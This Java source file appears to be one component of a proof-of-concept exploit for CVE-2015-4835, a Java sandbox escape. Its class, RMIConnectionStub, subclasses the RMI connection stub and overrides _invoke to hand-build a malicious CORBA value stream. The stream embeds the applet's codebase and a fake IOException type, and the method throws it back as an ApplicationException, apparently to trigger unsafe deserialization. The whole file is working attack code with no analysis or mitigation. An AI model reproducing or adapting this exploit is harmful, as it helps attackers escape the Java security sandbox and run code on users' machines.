package poc.cve_2015_4835;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.channels.ByteChannel;

import javax.management.remote.rmi._RMIConnection_Stub;
import javax.rmi.CORBA.Util;
import javax.rmi.CORBA.ValueHandler;

import org.omg.CORBA.ORB;
import org.omg.CORBA.portable.ApplicationException;
import org.omg.CORBA.portable.InputStream;
import org.omg.CORBA.portable.OutputStream;


@SuppressWarnings("unchecked")
public class RMIConnectionStub extends _RMIConnection_Stub implements ByteChannel {

	@Override
	public OutputStream _request( String s, boolean b ) {
		return null;
	}
	
	@Override
	public InputStream _invoke( OutputStream o ) throws ApplicationException {
		try {
			System.err.println( "Getting ORB instance." );
			ORB orb = ORB.init( Main.INSTANCE, null );
			ValueHandler vHandler = Util.createValueHandler();
			
			OutputStream out = orb.create_output_stream();
			( ( org.omg.CORBA_2_3.portable.OutputStream ) out ).write_value( Main.class );
			out.write_string( "IDL:java/io/IOEx:1.0" );
			
			out.write_ulong( 2 | 1 );
			out.write_string( Main.INSTANCE.getCodeBase().toExternalForm() );
			out.write_string( vHandler.getRMIRepositoryID( IOE.class ) );
			vHandler.writeValue( out, new IOEStub( ) );
			out.write_ulong( 16 );
			out.write_octet( ( byte ) 1 );
			out.write_boolean( false );
			( ( org.omg.CORBA_2_3.portable.OutputStream ) out ).write_value( Main.class );
			
			InputStream in = out.create_input_stream();
			( ( org.omg.CORBA_2_3.portable.InputStream ) in ).read_value();
			
			System.err.println( "Throwing exception." );
			throw new ApplicationException( "", in );
		}
		catch( Throwable t ) {
			if( t instanceof ApplicationException ) {
				throw ( ApplicationException ) t;
			}
			t.printStackTrace();
			return null;
		}
	}
	
	// Unimplemented methods, throws exception on invocation
	
	@Override
	public int read( ByteBuffer dst ) throws IOException {
		Main.unimplemented( );
		return 0;
	}

	@Override
	public boolean isOpen() {
		Main.unimplemented( );
		return false;
	}

	@Override
	public int write( ByteBuffer src ) throws IOException {
		Main.unimplemented( );
		return 0;
	}

	

}
